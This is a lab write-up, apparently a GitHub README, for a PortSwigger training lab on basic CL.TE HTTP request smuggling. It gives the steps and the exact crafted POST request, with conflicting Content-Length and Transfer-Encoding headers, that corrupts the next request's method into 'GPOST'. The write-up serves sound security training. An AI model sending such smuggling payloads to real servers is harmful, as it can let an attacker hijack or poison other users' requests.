# HTTP - request smuggling, basic CL.TE vulnerability

## 📌 Lab Details
- **Title**: HTTP request smuggling, basic CL.TE vulnerability
- **Difficulty**: Practitioner
- **Category**: HTTP Request Smuggling
- **Lab URL**: https://portswigger.net/academy/labs/launch/ebc97abbe886e96facc0aaee856f55e2a45d4784f5d9025ffa5e994b7d8bc2bb?referrer=%2fweb-security%2frequest-smuggling%2flab-basic-cl-te

## 🔍 Summary
This lab exploits a mismatch where the front-end used `Content-Length` and the back-end used `Transfer-Encoding`, allowing a crafted request to turn the next request's method into `GPOST`, proving request smuggling.

## 🛠 Steps to Solve
1. Intercept the request and send it to **Burp Repeater**.
2. Now, issue the following request twice:
   ```sh
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 6
   Transfer-Encoding: chunked

   0

   G
   ```
3. The second response should say: `Unrecognized method GPOST`.

## 📖 Key Takeaways
- **CL.TE** vulnerability = *Content-Length honored by front-end, Transfer-Encoding honored by back-end*.
- Even small payloads (like a single `G`) can corrupt the next request method.
- Different parsing logic between servers can be exploited without needing a full second malicious request.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2097a955-2647-475a-a0cf-cc05017c1127" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c4cc771b-5252-4e9b-994d-83133b416c75" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/fd625bd9-f0b8-4fc5-ae74-a3eb0024d35d" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/985d165c-4651-4661-ab82-403a380003f8" />
